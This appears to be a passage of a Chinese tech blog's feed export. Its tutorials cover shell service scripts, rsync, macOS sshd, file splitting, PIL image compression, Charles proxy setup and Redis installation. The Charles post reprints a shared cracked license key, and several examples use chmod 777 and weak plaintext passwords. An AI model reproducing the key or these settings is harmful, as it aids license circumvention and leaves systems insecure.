\033[0m&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">find_help</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;31m 请输入正确的操作命令！ \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m 命令参数：&#123;start|stop|restart|status|debug&#125; \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m 用法： \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     start    启动应用程序 \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     stop     停止应用程序 \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     restart  重启应用程序 \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     status   查看应用程序运行状态和PID \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     debug    Debug模式启动应用程序 \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">    find_help;</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">    start)</span><br><span class="line">    start;;</span><br><span class="line">    stop)</span><br><span class="line">    stop;;</span><br><span class="line">    restart)</span><br><span class="line">    restart;;</span><br><span class="line">    status)</span><br><span class="line">    status;;</span><br><span class="line">    debug)</span><br><span class="line">    debug;;</span><br><span class="line">    *)</span><br><span class="line">    find_help;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="设置别名"><a href="#设置别名" class="headerlink" title="设置别名"></a>设置别名</h4><p>通常情况，我们运行一个脚本，需要使用“sh + 脚本路径 + 参数”的方式，管理起来可能不太方便，所以我们一般会给他设置一个别名来管理。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alias &lt;别名&gt;&#x3D;&lt;sh脚本路径&gt;</span><br></pre></td></tr></table></figure>
<p>了解了alias命令的语法后，我们直接执行就好了吗？不是的，如果直接执行，那么在你关闭ssh终端后重新连接，命令就失效啦。<br>我们需要将这个命令追加到~/.bashrc文件中，才能保证命令不会失效。<br>我们来试试吧，示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 777 /home/pro-mall/c.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;alias mall=/home/pro-mall/c.sh&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>设置好别名后的使用方法，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mall start</span><br><span class="line">mall stop</span><br><span class="line">mall debug</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>使用rsync同步服务器数据</title>
    <url>/2020/06/20/shell-rsync/</url>
    <content><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>rsync是一个快速和非常灵活的文件拷贝工具，增量拷贝工具。</p>
<p>rsync的使用方式与SCP差不多，但rsync相对SCP有更多的额外选项。通过rsync –help命令可以查看支持选项类型的完整列表和帮助信息。</p>
<p>rsync通常使用SSH或RSH与远程通信系统，它不需要设置，也不需要特殊的权限来安装。使用ssh是相对比较安全的，也是推荐的。</p>
<p>rsync守护进程方式启动是通过指定的选项–daemon来完成的，默认端口为873。rsync必须以root身份运行，因为它必须具有读取和写入数据、日志和锁定文件的权限。</p>
<h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><p>1，下载安装，直接到官网找到你需要下载的版本，复制下载地址，直接到服务器上使用wget下载安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://download.samba.org/pub/rsync/src/rsync-3.1.2.tar.gz</span><br><span class="line"> </span><br><span class="line">tar -zxvf rsync-3.1.2.tar.gz</span><br><span class="line"> </span><br><span class="line"><span class="built_in">cd</span> rsync-3.1.2</span><br><span class="line"> </span><br><span class="line">./configure</span><br><span class="line"> </span><br><span class="line">make</span><br><span class="line"> </span><br><span class="line">make install</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>安装完成后，会把rsync命令文件路径输出，注意记下来，一般是/usr/local/bin目录，然后可以查看版本号来检查是否安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync --version</span><br></pre></td></tr></table></figure>


<p>2，配置文件</p>
<p>目前，rsync安装完成后，不会预设一些配置文件，相关的配置文件都需要自己去新建，关于配置文件的官方介绍地址：<br><a href="https://download.samba.org/pub/rsync/rsyncd.conf.html">https://download.samba.org/pub/rsync/rsyncd.conf.html</a></p>
<p>1),创建相关文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/rsync/conf</span><br><span class="line">mkdir -p /etc/rsync/<span class="built_in">log</span></span><br><span class="line">mkdir -p /etc/rsync/run</span><br></pre></td></tr></table></figure>
<p>2),创建rsyncd.secrets秘钥文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;root:pwd333&quot;</span> &gt;&gt; /etc/rsync/conf/rsyncd.secrets</span><br><span class="line">chmod 600 /etc/rsync/conf/rsyncd.secrets</span><br></pre></td></tr></table></figure>
<p>3),创建motd欢迎文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-----------------rsync-----------------&quot;</span> &gt;&gt; /etc/rsync/conf/rsyncd.motd</span><br></pre></td></tr></table></figure>
<p>4)，创建rsyncd.conf主配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;uid = nobody</span></span><br><span class="line"><span class="string">gid = nobody</span></span><br><span class="line"><span class="string">use chroot = yes</span></span><br><span class="line"><span class="string">max connections = 100</span></span><br><span class="line"><span class="string">list = yes</span></span><br><span class="line"><span class="string">timeout = 300</span></span><br><span class="line"><span class="string">port = 873</span></span><br><span class="line"><span class="string">log file = /etc/rsync/log/rsync.log</span></span><br><span class="line"><span class="string">pid file = /etc/rsync/run/rsyncd.pid</span></span><br><span class="line"><span class="string">lock file = /etc/rsync/run/rsync.lock</span></span><br><span class="line"><span class="string">motd file = /etc/rsync/conf/rsyncd.motd</span></span><br><span class="line"><span class="string">secrets file = /etc/rsync/conf/rsyncd.secrets</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[test]</span></span><br><span class="line"><span class="string">path = /data/test</span></span><br><span class="line"><span class="string">comment = test rsync</span></span><br><span class="line"><span class="string">ignore errors </span></span><br><span class="line"><span class="string">auth users = root</span></span><br><span class="line"><span class="string">read only = no</span></span><br><span class="line"><span class="string">hosts allow = ssh.soilove.cn&quot;</span> &gt;&gt; /etc/rsync/conf/rsyncd.conf</span><br></pre></td></tr></table></figure>
<p>3，启动服务，重新启动，如果pid文件存在会提示错误，所以先删除文件再启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /etc/rsync/run/rsyncd.pid</span><br><span class="line"> </span><br><span class="line">/usr/<span class="built_in">local</span>/bin/rsync --daemon --config=/etc/rsync/conf/rsyncd.conf</span><br></pre></td></tr></table></figure>
<p>4，在另一台服务器上也按照同样的步骤安装好rsync即可</p>
<h4 id="数据拷贝"><a href="#数据拷贝" class="headerlink" title="数据拷贝"></a>数据拷贝</h4><p>1，从远程服务器拉取数据：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -vzrtopg --progress root@soilove.cn::<span class="built_in">test</span> /home/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@izuf65v28cpic4oqb2e45ez home]# rsync -vzrtopg –progress root@soilove.cn::test &#x2F;home&#x2F;test</span><br><span class="line">—————–rsync—————–</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">receiving incremental file list</span><br><span class="line">.&#x2F;</span><br><span class="line">a.txt</span><br><span class="line">2 100% 1.95kB&#x2F;s 0:00:00 (xfr#1, to-chk&#x3D;0&#x2F;2)</span><br><span class="line"></span><br><span class="line">sent 50 bytes received 119 bytes 37.56 bytes&#x2F;sec</span><br><span class="line">total size is 2 speedup is 0.01</span><br></pre></td></tr></table></figure>
<p>2，拉取数据时指定忽略文件,这里的指定的忽略文件是配置的/data/test的相对路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -vzrtopg --progress --exclude=cc.txt root@soilove.cn::<span class="built_in">test</span> /home/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>3，推送数据到远程服务器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -vzrtopg --progress /home/<span class="built_in">test</span>/* root@soilove.cn::<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>官方文档：</p>
<p><a href="https://rsync.samba.org/">https://rsync.samba.org</a><br><a href="https://download.samba.org/pub/rsync/rsyncd.conf.html">https://download.samba.org/pub/rsync/rsyncd.conf.html</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>数据同步</tag>
        <tag>rsync</tag>
      </tags>
  </entry>
  <entry>
    <title>mac sshd服务</title>
    <url>/2020/06/27/shell-mac-sshd/</url>
    <content><![CDATA[<p>ssh服务是我们进行远程连接时，最常用的服务，不过一般情况下都是在linux上操作，那么mac上的ssh服务如何启动呢？</p>
<p>启动sshd服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist</span><br></pre></td></tr></table></figure>
<p>停止sshd服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo launchctl unload -w /System/Library/LaunchDaemons/ssh.plist</span><br></pre></td></tr></table></figure>
<p>检查启动情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo launchctl list | grep ssh</span><br></pre></td></tr></table></figure>
<p>成功启动输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">－－－－－－－－－－－－－－</span><br><span class="line">- 0 com.openssh.sshd</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>shell拆分大文件</title>
    <url>/2020/06/20/shell-split/</url>
    <content><![CDATA[<h4 id="shell拆分大文件"><a href="#shell拆分大文件" class="headerlink" title="shell拆分大文件"></a>shell拆分大文件</h4><p>1，按照行数拆分</p>
<p>语法：split -行数 文件 /路径/前缀</p>
<p>示例：针对a.log文件进行拆分，每6行拆分一个文件，拆分的文件存放在/tmp下，按照new为前缀生成:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">split -6 a.log /tmp/new</span><br></pre></td></tr></table></figure>

<p>2，按照文件大小拆分</p>
<p>语法：split -b 大小 文件 /路径/前缀</p>
<p>示例：针对a.log文件进行拆分，每10m生成一个文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">split -b 10m a.log /tmp/new</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>拆分文件</tag>
      </tags>
  </entry>
  <entry>
    <title>python-使用PIL批量压缩图片</title>
    <url>/2021/01/09/py-image-compres/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;今天迁移文件，需要对大量的图片进行压缩，用PS一张一张的处理效率特别低，而在网上的在线工具批量处理几乎都是收费的，所以干脆用python脚本来处理，一劳永逸，以后也方便自己使用。</p>
<h4 id="安装PIL图像处理库"><a href="#安装PIL图像处理库" class="headerlink" title="安装PIL图像处理库"></a>安装PIL图像处理库</h4><p><code>PIL</code>是一个<code>Python</code>图像处理库，<code>Pillow</code>是<code>PIL</code>的一个很友好的分支，所以，我们可以通过安装<code>Pillow</code>来使用<code>PIL</code>。文档：<a href="https://pillow-cn.readthedocs.io/zh_CN/latest/index.html">pillow官网</a></p>
<p>我使用的是mac电脑，以下命令在mac上执行。</p>
<p>1，安装pip工具，如果已经安装，跳过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo easy_install pip</span><br></pre></td></tr></table></figure>
<p>2，安装Pillow，借助pip工具安装起来也很简单</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure>
<h4 id="压缩代码示例"><a href="#压缩代码示例" class="headerlink" title="压缩代码示例"></a>压缩代码示例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#!coding=utf-8</span></span><br><span class="line"><span class="comment">#author=guolin</span></span><br><span class="line"><span class="comment">#依赖：pip install Pillow</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尺寸比例</span></span><br><span class="line">size_ratio = <span class="number">0.3</span></span><br><span class="line"><span class="comment"># 压缩质量</span></span><br><span class="line">quality = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历文件夹压缩</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">batch_compress</span>(<span class="params">srcPath, distPath</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历文件夹</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(srcPath):</span><br><span class="line">        <span class="comment"># 目录验证</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(distPath):</span><br><span class="line">            os.makedirs(distPath)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 拼接完整的文件或文件夹路径</span></span><br><span class="line">        srcFile = os.path.join(srcPath, filename)</span><br><span class="line">        distFile = os.path.join(distPath, filename)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果是文件 就调用压缩</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(srcFile):</span><br><span class="line">            <span class="keyword">if</span>(is_image(srcFile)):</span><br><span class="line">                <span class="comment"># 执行压缩操作</span></span><br><span class="line">                compression(srcFile,distFile)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (distFile + <span class="string">&quot; 文件不是图片，跳过！&quot;</span>)</span><br><span class="line">        <span class="comment"># 如果是文件夹 就继续递归</span></span><br><span class="line">        <span class="keyword">elif</span> os.path.isdir(srcFile):</span><br><span class="line">            batch_compress(srcFile, distFile)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件是否为图片判断</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_image</span>(<span class="params">srcFile</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (srcFile.lower().endswith((<span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.dib&#x27;</span>,<span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.pbm&#x27;</span>, <span class="string">&#x27;.pgm&#x27;</span>, <span class="string">&#x27;.ppm&#x27;</span>, <span class="string">&#x27;.tif&#x27;</span>, <span class="string">&#x27;.tiff&#x27;</span>))):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩图片并保存</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compression</span>(<span class="params">srcFile,distFile</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 读取原图</span></span><br><span class="line">        srcImg = Image.<span class="built_in">open</span>(srcFile)</span><br><span class="line">        w, h = srcImg.size</span><br><span class="line">        <span class="comment"># 重新设置图片尺寸和选项，Image.ANTIALIAS：平滑抗锯齿</span></span><br><span class="line">        distImg = srcImg.resize((<span class="built_in">int</span>(w * size_ratio), <span class="built_in">int</span>(h * size_ratio)), Image.ANTIALIAS)</span><br><span class="line">        <span class="comment"># 保存为新图</span></span><br><span class="line">        distImg.save(distFile, quality=quality)</span><br><span class="line">        <span class="built_in">print</span> (distFile + <span class="string">&quot; 压缩成功！&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> (distFile + <span class="string">&quot; 压缩失败！异常信息：&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;=================开始执行=================&quot;</span>)</span><br><span class="line">    <span class="comment"># 指定图片目录以及压缩后的图片目录</span></span><br><span class="line">    batch_compress(<span class="string">&quot;/Users/mac/Downloads/images&quot;</span>, <span class="string">&quot;/Users/mac/Downloads/images/dist&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;=================执行结束=================&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>压缩图片</tag>
      </tags>
  </entry>
  <entry>
    <title>mac charles抓包工具安装设置</title>
    <url>/2020/08/01/mac-charles-install/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;作为开发，一款抓包工具，自然是必不可少。<code>charles</code>是一款非常优秀的抓包工具，收费，但也仅仅是启动多了一些广告和使用时间限制，所以基本不会影响使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">演示环境：</span><br><span class="line">电脑：mac</span><br><span class="line">手机：iphone</span><br></pre></td></tr></table></figure>
<h4 id="工具安装和设置"><a href="#工具安装和设置" class="headerlink" title="工具安装和设置"></a>工具安装和设置</h4><h5 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h5><p>官方下载地址：<a href="https://www.charlesproxy.com/download/">https://www.charlesproxy.com/download/</a></p>
<p>mac选择dmg格式的安装文件，下载后，直接双击安装即可。</p>
<p>安装完成后，直接打开可能会提示权限只读的错误信息，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Charles cannot configure your proxy settings while it is on a read-only volume.</span><br></pre></td></tr></table></figure>
<p>执行下面的命令进行授权即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chown -R root <span class="string">&quot;/Applications/Charles.app/Contents/Resources&quot;</span></span><br><span class="line">sudo chmod -R u+s <span class="string">&quot;/Applications/Charles.app/Contents/Resources&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="工具安装破解"><a href="#工具安装破解" class="headerlink" title="工具安装破解"></a>工具安装破解</h5><p>工具安装后，其实不需要去操心付费或破解的事，它提供的免费使用机制 其实足够我们正常使用。</p>
<p>不过，伟大的互联网民众里，总有那么些人，为了让我们有更好的体验而努力😂。<br>到 <a href="https://zhile.io/2017/07/07/charles-proxy-usage-and-license.html">zhile.io站点</a> 获取注册码。</p>
<p>注册码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Registered Name:  https:&#x2F;&#x2F;zhile.io</span><br><span class="line">License Key:   48891cf209c6d32bf4</span><br></pre></td></tr></table></figure>

<h5 id="工具代理设置"><a href="#工具代理设置" class="headerlink" title="工具代理设置"></a>工具代理设置</h5><p>打开菜单：<code>Proxy &gt;&gt; SSL Proxying Settings...</code></p>
<p>修改<code>SSL Proxying</code>配置：</p>
<p>1，钩上 <code>Enable SSL Proxying</code> 配置</p>
<p>2，添加 <code>Location</code>配置，Host和Port都不要填，直接新增，这样的结果是：<code>*</code> 匹配所有，如图：</p>
<image src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/charles/charles01.png" width=500>

<h4 id="手机证书安装"><a href="#手机证书安装" class="headerlink" title="手机证书安装"></a>手机证书安装</h4><p>1，打开 charles工具的证书安装菜单，选择手机证书安装。</p>
<p>具体路径：<code>Help &gt;&gt; SSL Proxying &gt;&gt; Install Charles Root Certificate on a Mobile Device or Remote Browser</code></p>
<p>点击后，会提示你如下信息，根据提示进行下一步配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Configure your device to use Charles as its HTTP proxy on 172.18.4.105:8888, </span><br><span class="line">then browse to chls.pro&#x2F;ssl to download and install the certificate.</span><br><span class="line"></span><br><span class="line">Note that on iOS 10 and later you must then go into Settings &gt; General &gt; About </span><br><span class="line">&gt; Certificate Trust Settings and enable the Charles certificate to be trusted.</span><br></pre></td></tr></table></figure>
<p>2，手机添加代理，首先确保iphone和mac连接的是同一个Wi-Fi，然后到Wi-Fi设置里添加代理配置，ip和端口就是上面所提示的：<code>xx.xx.xx.xx:8888</code>。</p>
<p>3，手机证书下载，浏览器打开网址：<code>chls.pro/ssl</code>，下载证书文件。</p>
<p>4，手机证书安装，到路径：<code>设置 &gt;&gt; 通用 &gt;&gt; 描述文件</code>，选择 <code>Charles Proxy CA ***</code> 文件，点击<code>安装</code></p>
<p>5，手机证书信任，到路径：<code>设置 &gt;&gt; 通用 &gt;&gt; 关于本机 &gt;&gt; 证书信任设置</code>，开启 <code>Charles Proxy CA ***</code> 证书即可。</p>
<p>好了，到现在，所有配置就完成了，可以正常抓包了。</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>charles</tag>
        <tag>抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis专栏-使用Docker单机部署Redis</title>
    <url>/2020/10/01/redis-docker-install/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;如果非要问怎么安装Redis最省心、最简单，那肯定要属<code>Docker</code>镜像安装了。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;docker hub镜像仓库中，有无数的开发者贡献了无数的镜像，可供选择，只需要一行docker命令，即可快速完成部署。不过要注意的是，最好选择带有<code>OFFICIAL IMAGE</code>标志的官方镜像，安全可靠！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Redis官方镜像仓库地址：https:&#x2F;&#x2F;hub.docker.com&#x2F;_&#x2F;redis</span><br></pre></td></tr></table></figure>

<h4 id="部署过程"><a href="#部署过程" class="headerlink" title="部署过程"></a>部署过程</h4><h5 id="docker-run部署"><a href="#docker-run部署" class="headerlink" title="docker run部署"></a>docker run部署</h5><p><code>docker run</code>命令的作用是创建一个新的容器并运行一个命令，我们可以通过下面的命令快速启动Redis服务，以及指定相关的命令或自定义配置文件。</p>
<p>指定参数启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name some-redis -d redis:6.0.9 redis-server --appendonly yes --requirepass <span class="string">&quot;password123&quot;</span></span><br></pre></td></tr></table></figure>
<p>指定配置文件启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -v /myredis/conf:/usr/<span class="built_in">local</span>/etc/redis --name some-redis -d redis:6.0.9 redis-server /usr/<span class="built_in">local</span>/etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
<p>停止：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop some-redis</span><br></pre></td></tr></table></figure>
<p>重启：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start some-redis</span><br></pre></td></tr></table></figure>

<h5 id="docker-compose部署"><a href="#docker-compose部署" class="headerlink" title="docker-compose部署"></a>docker-compose部署</h5><p><code>docker-compose</code>是docker的自己家的服务编排工具，主要是用来构建多个有关联的服务，通过它，让我们管理容器变得更加的得心应手。不过，一般单个服务，我们也会选择用它来构建。</p>
<p>docker-compose.yml：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># redis 缓存数据库</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">   <span class="attr">redis:</span></span><br><span class="line">     <span class="attr">image:</span> <span class="string">redis:6.0.9</span></span><br><span class="line">     <span class="attr">container_name:</span> <span class="string">some-redis</span></span><br><span class="line">     <span class="attr">volumes:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">data:/my/own/redis/data</span></span><br><span class="line">     <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">     <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">     <span class="attr">command:</span>  <span class="string">redis-server</span> <span class="string">--appendonly</span> <span class="literal">yes</span> <span class="string">--requirepass</span> <span class="string">&quot;password123&quot;</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">data:</span></span><br></pre></td></tr></table></figure>
<p>构建启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>停止：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose stop</span><br></pre></td></tr></table></figure>
<p>重启：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose restart</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>docker</category>
        <category>redis</category>
      </categories>
      <tags>
        <tag>分布式缓存</tag>
        <tag>缓存</tag>
        <tag>nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis专栏-单机部署Redis</title>
    <url>/2020/10/01/redis-sign-install/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>单机部署redis非常简单，只需要安装好对应的依赖，然后下载redis源代码，使用<code>make</code>命令，提取和编译Redis即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装环境：centos</span><br><span class="line"></span><br><span class="line">安装方式参考：https:&#x2F;&#x2F;redis.io&#x2F;download</span><br><span class="line"></span><br><span class="line">安装包下载地址：http:&#x2F;&#x2F;download.redis.io&#x2F;releases</span><br></pre></td></tr></table></figure>
<h4 id="部署过程"><a href="#部署过程" class="headerlink" title="部署过程"></a>部署过程</h4><h5 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h5><p>1，安装tcl、gcc等依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install tcl</span><br><span class="line">yum install gcc - c++</span><br></pre></td></tr></table></figure>
<p>2，升级gcc版本，并设置环境变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install centos-release-scl</span><br><span class="line">yum -y install devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source /opt/rh/devtoolset-9/enable&quot;</span> &gt;&gt; /etc/profile</span><br><span class="line">// 或 仅临时使用高版本的gcc</span><br><span class="line">scl <span class="built_in">enable</span> devtoolset-9 bash</span><br></pre></td></tr></table></figure>

<h5 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h5><p>1，下载redis，到<code>http://download.redis.io/releases</code>选择所需的版本下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">wget http://download.redis.io/releases/redis-6.0.9.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf redis-6.0.9.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> redis-6.0.9</span><br></pre></td></tr></table></figure>
<p>2，执行make，完成安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install PREFIX=/usr/<span class="built_in">local</span>/redis</span><br></pre></td></tr></table></figure>
<p>注：安装完成后，<code>redis-benchmark</code>、<code>redis-check-aof</code>、<code>redis-check-rdb</code>、<code>redis-cli</code>、<code>redis-sentinel</code>、<code>redis-server</code> 都会被复制到<code>/usr/local/redis/bin</code>目录下，可以直接使用。</p>
<h5 id="最常用配置"><a href="#最常用配置" class="headerlink" title="最常用配置"></a>最常用配置</h5><p>0，为了方便管理，一般，我们会把配置文件也拷贝到<code>/usr/local/redis/bin/</code>目录下，然后修改此目录下的文件来进行相关配置。不过随你，哪都一样。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /root/redis-6.0.9/redis.conf /usr/<span class="built_in">local</span>/redis/bin/redis.conf</span><br></pre></td></tr></table></figure>
